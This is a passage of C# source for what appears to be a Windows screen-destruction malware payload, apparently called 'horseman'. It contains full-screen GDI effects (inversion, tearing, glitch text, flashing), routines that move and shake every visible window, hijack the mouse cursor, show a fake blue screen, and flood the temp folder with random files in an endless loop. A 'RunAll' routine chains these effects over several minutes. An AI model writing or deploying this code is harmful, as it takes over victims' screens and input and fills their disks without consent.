                            FillRect(hdc, ref sq, hBlack);
                            DeleteObject(hBlack);
                        }
                    }

                pct += rng.Next(1, 4);
                if (pct > 100) pct = 100;
                Thread.Sleep(rng.Next(300, 800));
                if (_stop) break;
            }

            Thread.Sleep(2000);
            DeleteObject(hSadFont); DeleteObject(hMsgFont); DeleteObject(hSmallFont);
            ReleaseDC(IntPtr.Zero, hdc); DeleteDC(hdcMem); DeleteObject(bmp);
        }

        [DllImport("gdi32.dll")]
        static extern bool FillRect(IntPtr hdc, ref RECT lprc, IntPtr hbr);

        [StructLayout(LayoutKind.Sequential)]
        struct RECT { public int left, top, right, bottom; }

        static void DoInvertAll()
        {
            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                BitBlt(hdc, 0, 0, gw, gh, hdc, 0, 0, 0x00660046);
                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(200);
            }
        }

        static void DoScreenTear()
        {
            Random rng = new Random();
            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int y = rng.Next(gh);
                int h = rng.Next(10, 100);
                int offset = rng.Next(-50, 50);
                StretchBlt(hdc, offset, y, gw, h, hdc, 0, y, gw, h, SRCCOPY);
                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(16);
            }
        }

        static void DoGlitchText()
        {
            Random rng = new Random();
            string[] chars = { "\\", "/", "|", "-", "+", "=", "*", "#", "@", "!", "$", "%", "^", "&", "~", "`" };
            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                SetBkMode(hdc, 1);
                for (int i = 0; i < 20; i++)
                {
                    IntPtr hfnt = CreateFont(10 + rng.Next(30), 5 + rng.Next(15), rng.Next(-900, 900), 0, 100, 0, 0, 0, 1, 0, 0, 0, 0, "Consolas");
                    SelectObject(hdc, hfnt);
                    SetTextColor(hdc, CI((byte)rng.Next(256), (byte)rng.Next(256), (byte)rng.Next(256)));
                    string ch = chars[rng.Next(chars.Length)];
                    TextOut(hdc, rng.Next(gw), rng.Next(gh), ch, ch.Length);
                    DeleteObject(hfnt);
                }
                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(30);
            }
        }

        static void DoFreezeFrames()
        {
            Random rng = new Random();
            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr hdcMem = CreateCompatibleDC(hdc);
                int bw = rng.Next(50, 300), bh = rng.Next(50, 200);
                int bx = rng.Next(gw), by = rng.Next(gh);
                StretchBlt(hdcMem, 0, 0, bw, bh, hdc, bx, by, bw, bh, SRCCOPY);
                Thread.Sleep(rng.Next(100, 1000));
                StretchBlt(hdc, bx, by, bw, bh, hdcMem, 0, 0, bw, bh, SRCCOPY);
                ReleaseDC(IntPtr.Zero, hdc); DeleteDC(hdcMem);
            }
        }

        const int NOTSRCCOPY = 0x00330008;

        static void DoInvertScreen()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            while (!_stop)
            {
                BitBlt(hdc, 0, 0, gw, gh, hdc, 0, 0, NOTSRCCOPY);
                Thread.Sleep(2000);
            }
            ReleaseDC(IntPtr.Zero, hdc);
        }

        static void DoDarkEffect()
        {
            Random rng = new Random();
            IntPtr hdc = GetDC(IntPtr.Zero);
            while (!_stop)
            {
                IntPtr brush = CreateSolidBrush(CI((byte)rng.Next(255), (byte)rng.Next(255), (byte)rng.Next(255)));
                SelectObject(hdc, brush);
                BitBlt(hdc, rng.Next(2), rng.Next(2), gw, gh, hdc, rng.Next(2), rng.Next(2), SRCAND);
                DeleteObject(brush);
                Thread.Sleep(3);
            }
            ReleaseDC(IntPtr.Zero, hdc);
        }

        static void DoScreenStretch()
        {
            Random rng = new Random();
            IntPtr hdc = GetDC(IntPtr.Zero);
            while (!_stop)
            {
                int x1 = rng.Next(gw);
                int y1 = rng.Next(gh);
                StretchBlt(hdc, x1, y1, 200, 200, hdc, x1 + rng.Next(21) - 10, y1 + rng.Next(21) - 10, 200, 200, 0xEE0086);
                Thread.Sleep(10);
            }
            ReleaseDC(IntPtr.Zero, hdc);
        }

        static void DoPatInvertChaos()
        {
            Random rng = new Random();
            IntPtr hdc = GetDC(IntPtr.Zero);
            while (!_stop)
            {
                if (rng.Next(3) == 0)
                {
                    IntPtr brush = CreateSolidBrush(CI((byte)rng.Next(255), (byte)rng.Next(255), (byte)rng.Next(255)));
                    SelectObject(hdc, brush);
                    PatBlt(hdc, 0, 0, gw, gh, PATINVERT);
                    DeleteObject(brush);
                    Thread.Sleep(rng.Next(1000));
                }
                if (rng.Next(7) == 0)
                {
                    IntPtr brush = CreateSolidBrush(CI((byte)rng.Next(75), (byte)rng.Next(75), (byte)rng.Next(75)));
                    SelectObject(hdc, brush);
                    PatBlt(hdc, 0, 0, gw, gh, PATINVERT);
                    DeleteObject(brush);
                }
                Thread.Sleep(10);
            }
            ReleaseDC(IntPtr.Zero, hdc);
        }

        static void DoWindowChaos()
        {
            Random rng = new Random();
            while (!_stop)
            {
                try
                {
                    EnumWindows((h, lp) =>
                    {
                        if (IsWindowVisible(h) && rng.Next(3) == 0)
                        {
                            int w = rng.Next(100, 800);
                            int h2 = rng.Next(100, 600);
                            int x = rng.Next(-200, gw);
                            int y = rng.Next(-200, gh);
                            MoveWindow(h, x, y, w, h2, true);
                        }
                        return true;
                    }, IntPtr.Zero);
                }
                catch { }
                Thread.Sleep(500);
            }
        }

        static void DoResolutionFlicker()
        {
            Random rng = new Random();
            int[] widths = { 640, 800, 1024, 1280, 1920 };
            int[] heights = { 480, 600, 768, 720, 1080 };
            while (!_stop)
            {
                try
                {
                    int idx = rng.Next(widths.Length);
                    IntPtr hdc = GetDC(IntPtr.Zero);
                    int origW = GetSystemMetrics(SM_CXSCREEN);
                    int origH = GetSystemMetrics(SM_CYSCREEN);

                    int newW = widths[idx];
                    int newH = heights[idx];

                    IntPtr hDCMem = CreateCompatibleDC(hdc);
                    IntPtr hBmp = CreateCompatibleBitmap(hdc, origW, origH);
                    SelectObject(hDCMem, hBmp);
                    BitBlt(hDCMem, 0, 0, origW, origH, hdc, 0, 0, SRCCOPY);

                    StretchBlt(hdc, 0, 0, newW, newH, hDCMem, 0, 0, origW, origH, SRCCOPY);

                    DeleteObject(hBmp);
                    DeleteDC(hDCMem);
                    ReleaseDC(IntPtr.Zero, hdc);

                    Thread.Sleep(rng.Next(100, 300));
                }
                catch { }
            }
        }

        static void DoMouseChaos()
        {
            Random rng = new Random();
            IntPtr hCursor = LoadCursor(IntPtr.Zero, 32512);
            while (!_stop)
            {
                try
                {
                    int x = rng.Next(gw);
                    int y = rng.Next(gh);
                    SetCursorPos(x, y);
                    Thread.Sleep(10);
                }
                catch { }
            }
        }

        static void DoWindowShake()
        {
            Random rng = new Random();
            while (!_stop)
            {
                try
                {
                    EnumWindows((h, lp) =>
                    {
                        if (IsWindowVisible(h) && rng.Next(5) == 0)
                        {
                            RECT r;
                            GetWindowRect(h, out r);
                            int shake = 10;
                            for (int i = 0; i < 5 && !_stop; i++)
                            {
                                int ox = rng.Next(-shake, shake);
                                int oy = rng.Next(-shake, shake);
                                MoveWindow(h, r.left + ox, r.top + oy, r.right - r.left, r.bottom - r.top, true);
                                Thread.Sleep(20);
                            }
                        }
                        return true;
                    }, IntPtr.Zero);
                }
                catch { }
                Thread.Sleep(100);
            }
        }

        static void DoTempFlood()
        {
            try
            {
                string temp = Path.GetTempPath();
                Random rng = new Random();
                while (!_stop)
                {
                    try
                    {
                        string file = Path.Combine(temp, "horseman_" + rng.Next(100000) + ".tmp");
                        byte[] data = new byte[1024];
                        rng.NextBytes(data);
                        File.WriteAllBytes(file, data);
                    }
                    catch { }
                    Thread.Sleep(10);
                }
            }
            catch { }
        }

        static void DoIconRain2()
        {
            Random rng = new Random();
            IntPtr hErr = LoadIcon(IntPtr.Zero, (IntPtr)IDI_ERROR);
            IntPtr hWarn = LoadIcon(IntPtr.Zero, (IntPtr)IDI_WARNING);
            IntPtr hApp = LoadIcon(IntPtr.Zero, (IntPtr)IDI_APPLICATION);
            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr[] icons = { hErr, hWarn, hApp };
                for (int i = 0; i < 15; i++)
                {
                    IntPtr hIcon = icons[rng.Next(3)];
                    int sz = 16 + rng.Next(8) * 8;
                    DrawIconEx(hdc, rng.Next(gw), rng.Next(gh), hIcon, sz, sz, 0, IntPtr.Zero, DI_NORMAL);
                }
                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(16);
            }
        }

        static void PersistentIcons()
        {
            Random rng = new Random();
            IntPtr hErr = LoadIcon(IntPtr.Zero, (IntPtr)IDI_ERROR);
            IntPtr hWarn = LoadIcon(IntPtr.Zero, (IntPtr)IDI_WARNING);
            IntPtr hApp = LoadIcon(IntPtr.Zero, (IntPtr)IDI_APPLICATION);
            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr[] icons = { hErr, hWarn, hApp };
                for (int i = 0; i < 5; i++)
                {
                    IntPtr hIcon = icons[rng.Next(3)];
                    int sz = 16 + rng.Next(6) * 8;
                    DrawIconEx(hdc, rng.Next(gw), rng.Next(gh), hIcon, sz, sz, 0, IntPtr.Zero, DI_NORMAL);
                }
                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(50);
            }
        }

        public static void RunAll()
        {
            Thread t;
            Thread ticons = null;

            if (!Main_Class.isPayload2)
            {
                ticons = Run(PersistentIcons);

                t = Run(Nosignal); new Thread(Sound0).Start(); Thread.Sleep(10000); StopAll();

                t = Run(DoShader1); new Thread(Sound1).Start(); Thread.Sleep(30000); StopAll();

                t = Run(DoShader2); new Thread(Sound2).Start(); Thread.Sleep(30000); StopAll();

                t = Run(DoShader3); new Thread(Sound3).Start(); Thread.Sleep(30000); StopAll();

                Thread t4a = Run(DoDarker); Thread t4b = Run(DoPolygon); new Thread(Sound4).Start(); Thread.Sleep(30000); StopAll();

                t = Run(DoShader4); new Thread(Sound5).Start(); Thread.Sleep(30000); StopAll();

                Thread t6a = Run(DoShader5); Thread t6b = Run(DoTextOut); new Thread(Sound6).Start(); Thread.Sleep(30000); StopAll();

                Thread t7a = Run(DoWoah); Thread t7b = Run(DoLines); Thread t7c = Run(DoShell32); Thread t7d = Run(DoCursorRain); new Thread(Sound7).Start(); Thread.Sleep(30000); StopAll();

                Thread t8a = Run(DoInvertScreen); Thread t8b = Run(DoDarkEffect); new Thread(Sound8).Start(); Thread.Sleep(30000); StopAll();

                Thread t9a = Run(DoScreenStretch); Thread t9b = Run(DoPatInvertChaos); new Thread(Sound1).Start(); Thread.Sleep(30000); StopAll();

                Thread t10a = Run(DoWindowChaos); Thread t10b = Run(DoWindowShake); Thread t10c = Run(DoIconRain2); new Thread(Sound3).Start(); Thread.Sleep(30000); StopAll();

                Thread t11a = Run(DoResolutionFlicker); Thread t11b = Run(DoMouseChaos); new Thread(Sound5).Start(); Thread.Sleep(30000); StopAll();

                new Thread(DoTempFlood).Start(); Thread.Sleep(10000);

                t = Run(DoShader6); new Thread(Sound2).Start();
            }
            else
            {
                DoFakeBSOD();

                ticons = Run(PersistentIcons);

                t = Run(DoInvertAll); new Thread(Sound1).Start(); Thread.Sleep(30000); StopAll();

                Thread t2a = Run(DoScreenTear); Thread t2b = Run(DoGlitchText); new Thread(Sound3).Start(); Thread.Sleep(30000); StopAll();

                t = Run(DoShader4); new Thread(Sound5).Start(); Thread.Sleep(30000); StopAll();

                Thread t4a = Run(DoDarker); Thread t4b = Run(DoPolygon); Thread t4c = Run(DoFreezeFrames); new Thread(Sound7).Start(); Thread.Sleep(30000); StopAll();

                Thread t6a = Run(DoShader5); Thread t6b = Run(DoTextOut); Thread t6c = Run(DoScreenTear); new Thread(Sound6).Start(); Thread.Sleep(30000); StopAll();

                Thread t7a = Run(DoWoah); Thread t7b = Run(DoLines); Thread t7c = Run(DoShell32); Thread t7d = Run(DoCursorRain); new Thread(Sound8).Start(); Thread.Sleep(30000); StopAll();

                Thread t8a = Run(DoInvertScreen); Thread t8b = Run(DoDarkEffect); Thread t8c = Run(DoScreenStretch); new Thread(Sound1).Start(); Thread.Sleep(30000); StopAll();

                Thread t9a = Run(DoPatInvertChaos); Thread t9b = Run(DoShader1); new Thread(Sound4).Start(); Thread.Sleep(30000); StopAll();

                Thread t10a = Run(DoWindowChaos); Thread t10b = Run(DoWindowShake); Thread t10c = Run(DoResolutionFlicker); new Thread(Sound6).Start(); Thread.Sleep(30000); StopAll();

                Thread t11a = Run(DoMouseChaos); Thread t11b = Run(DoIconRain2); new Thread(Sound7).Start(); Thread.Sleep(30000); StopAll();

                new Thread(DoTempFlood).Start(); Thread.Sleep(15000);

                t = Run(DoShader6); new Thread(Sound2).Start();
            }
        }
    }
}
